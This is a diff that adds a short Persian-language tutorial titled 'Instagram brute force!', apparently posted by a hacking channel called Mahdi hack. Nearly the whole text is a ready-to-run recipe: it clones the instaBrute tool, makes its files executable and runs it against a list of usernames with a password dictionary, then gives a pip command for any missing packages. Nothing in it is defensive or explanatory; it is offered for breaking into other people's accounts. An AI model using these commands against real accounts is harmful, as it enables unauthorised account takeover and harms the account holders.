@@ -1,0 +1,17 @@
+بورت فورس اینستاگرام !
+Mahdiihack  / Hacked16
+
+
+کافیه یوزر و پسورد لیست رو به اسکریپت اوپن سورس پایتون بدید
+
+git clone https://github.com/chinoogawa/instaBrute.git
+cd instaBrute
+chmod +x *.*
+ python instaBrute.py -f usernames.txt -d dictionary.txt
+ 
+در صورت نبود پکیج مورد نیاز با دستور زیر نصب کنید 
+pip install -U packagename
+
+
+تهیه شده توسط کانال امنیتی مهدی هک
+@Mahdiihack / #Hacked16 
